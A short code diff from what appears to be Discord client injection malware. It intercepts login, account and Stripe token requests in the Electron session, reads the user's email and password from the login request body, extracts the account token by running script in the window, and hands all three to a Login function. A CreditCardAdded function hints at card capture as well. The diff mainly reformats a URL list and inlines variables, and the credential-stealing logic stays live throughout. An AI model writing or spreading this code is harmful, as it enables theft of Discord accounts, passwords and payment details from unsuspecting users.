@@ -314,17 +314,22 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 }
 
 const UrlFilter = {
-	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+	urls: [
+        'https://discordapp.com/api/v*/users/@me',
+        'https://*.discord.com/api/v*/users/@me',
+        'https://discordapp.com/api/v*/auth/login',
+        'https://discord.com/api/v*/auth/login',
+        'https://*.discord.com/api/v*/auth/login',
+        'https://api.stripe.com/v*/tokens'
+    ]
 };
 session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
 	if (details.url.endsWith("login")) {
 		if (details.statusCode == 200) {
 			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
-			const email = data.login;
-			const password = data.password;
 			const window = BrowserWindow.getAllWindows()[0];
 			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
-				Login(email, password, token)
+				Login(data.login, data.password, token)
 			}))
 		}
 	}
